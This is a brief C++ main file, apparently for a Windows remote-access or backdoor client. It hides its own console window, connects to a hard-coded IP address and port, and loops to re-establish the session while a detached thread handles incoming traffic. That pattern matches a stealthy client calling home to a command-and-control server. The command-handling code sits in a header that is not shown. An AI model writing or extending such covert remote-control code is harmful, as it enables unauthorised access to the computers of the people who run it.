#include "client.hpp"

int main (void)
{
    FreeConsole();
    client *c = new client("172.17.52.181", 3333);

    c->init();

    while (true) if (c->setup()) break;

    std::thread(&client::handler, c).detach();

    while (c->isKill == false)
    {
        if (c->isSessionValid == false)
        {
            if (c->setup())
                c->isSessionValid = true;
        }
        Sleep(500);
    }
    
    c->cleanup();
    delete c;
    return EXIT_SUCCESS;
}